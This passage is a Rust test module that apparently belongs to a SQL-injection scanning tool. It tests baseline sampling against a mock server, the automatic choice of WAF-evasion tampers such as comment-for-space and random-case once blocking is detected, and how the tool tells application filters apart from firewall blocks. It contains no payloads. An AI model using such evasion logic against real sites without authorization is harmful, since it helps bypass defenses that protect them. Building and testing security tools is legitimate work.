            .timeout(Duration::from_secs(5))
            .jitter(Jitter::new(1.0, 0.5).with_min(0))
            .rate_limiter(Arc::new(RateLimiter::disabled()))
            .allow_private(true)
            .build()
            .expect("client build");
        let cfg = EngineConfig::test_defaults();
        let cancel = CancellationToken::new();
        let engine = Engine::new(cfg, client, cancel);
        let target =
            TargetUrl::parse(&format!("{}/?id=1", server.uri()), true).expect("target parse");
        let collected = engine
            .collect_baseline_uncached(&target, None)
            .await
            .expect("baseline ok")
            .expect("some baseline");
        let (baseline, _, _) = collected;
        assert_eq!(
            baseline.status_codes.len(),
            3,
            "concurrent baseline must return 3 samples"
        );
        assert!(baseline.status_codes.iter().all(|c| *c == 200));
    }

    #[test]
    fn waf_auto_tampers_are_space2comment_plus_randomcase() {
        use crate::techniques::tamper::Tamper;
        assert_eq!(
            super::waf_auto_tampers(),
            vec![Tamper::Space2Comment, Tamper::RandomCase]
        );
        // Blocking + no user tampers => auto-pair (never HPP/chunked here).
        assert_eq!(
            super::resolve_effective_tampers(true, &[]),
            vec![Tamper::Space2Comment, Tamper::RandomCase]
        );
        // Explicit user tampers always win, even when blocking.
        let user = vec![Tamper::VersionedComment];
        assert_eq!(super::resolve_effective_tampers(true, &user), user);
        // No block => user set unchanged (including empty).
        assert!(super::resolve_effective_tampers(false, &[]).is_empty());
    }

    #[test]
    fn app_filter_block_needs_double_400() {
        assert!(super::is_app_filter_block(400, 400));
        assert!(!super::is_app_filter_block(400, 200));
        assert!(!super::is_app_filter_block(200, 400));
        assert!(!super::is_app_filter_block(200, 200));
        // WAF statuses never count as app filter (separate gate).
        assert!(!super::is_app_filter_block(403, 403));
        assert!(!super::is_app_filter_block(406, 406));
        assert_eq!(super::APP_FILTER_STATUS, 400);
        assert_eq!(super::FILTER_STREAK_LIMIT, 3);
    }
}
